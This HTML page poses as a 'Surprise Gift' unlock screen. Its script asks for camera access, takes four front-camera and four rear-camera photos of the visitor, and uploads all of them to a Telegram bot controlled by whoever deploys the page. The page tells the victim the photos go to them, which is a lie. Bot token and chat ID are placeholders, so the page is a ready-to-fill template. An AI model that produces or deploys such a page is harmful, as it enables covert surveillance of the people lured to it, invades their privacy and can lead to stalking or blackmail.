<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>üéÅ Surprise Gift</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  background: linear-gradient(135deg,#1a002b,#000);
  font-family: Arial, sans-serif;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.box {
  background: rgba(0,0,0,.8);
  border-radius: 20px;
  padding: 25px;
  max-width: 350px;
  width: 90%;
  text-align: center;
  box-shadow: 0 0 25px #ff00ff;
}

button {
  background: linear-gradient(90deg,#ff00ff,#ff66ff);
  border: none;
  border-radius: 30px;
  padding: 14px 25px;
  font-size: 16px;
  color: #000;
  cursor: pointer;
  margin-top: 15px;
}

#video {
  width: 100%;
  border-radius: 15px;
  display: none;
  margin-top: 15px;
}

.status {
  margin-top: 10px;
  font-size: 14px;
  color: #ccc;
}
</style>
</head>

<body>
<div class="box">
  <h2>üéÅ Unlock Your Surprise</h2>
  <p>We need camera permission.<br>
  <b>8 photos (4 front + 4 back)</b><br>
  will be sent to you and the bot.</p>

  <button onclick="start()">üîì Allow & Continue</button>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" hidden></canvas>

  <div class="status" id="status"></div>
</div>

<script>
const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const status = document.getElementById("status");
const ctx = canvas.getContext("2d");

let stream;
let photos = [];

async function openCamera(mode) {
  if (stream) stream.getTracks().forEach(t => t.stop());

  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: mode },
    audio: false
  });

  video.srcObject = stream;
  video.style.display = "block";

  await video.play();
  await new Promise(r => setTimeout(r, 800));
}

function capture() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  return canvas.toDataURL("image/jpeg", 0.8);
}

async function send(base64, caption) {
  const blob = await (await fetch(base64)).blob();
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob);
  fd.append("caption", caption);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  });
}

async function start() {
  status.innerText = "üì∏ Opening front camera...";
  await openCamera("user");

  for (let i=1;i<=4;i++) {
    photos.push(capture());
    status.innerText = `Front photo ${i}/4`;
    await new Promise(r=>setTimeout(r,700));
  }

  status.innerText = "üîÑ Switching camera...";
  await openCamera("environment");

  for (let i=1;i<=4;i++) {
    photos.push(capture());
    status.innerText = `Back photo ${i}/4`;
    await new Promise(r=>setTimeout(r,700));
  }

  stream.getTracks().forEach(t => t.stop());
  status.innerText = "‚¨ÜÔ∏è Sending photos...";

  for (let i=0;i<photos.length;i++) {
    await send(photos[i], `üì∏ ${i+1}/8`);
  }

  status.innerText = "‚úÖ Gift unlocked!";
}
</script>
</body>
</html>
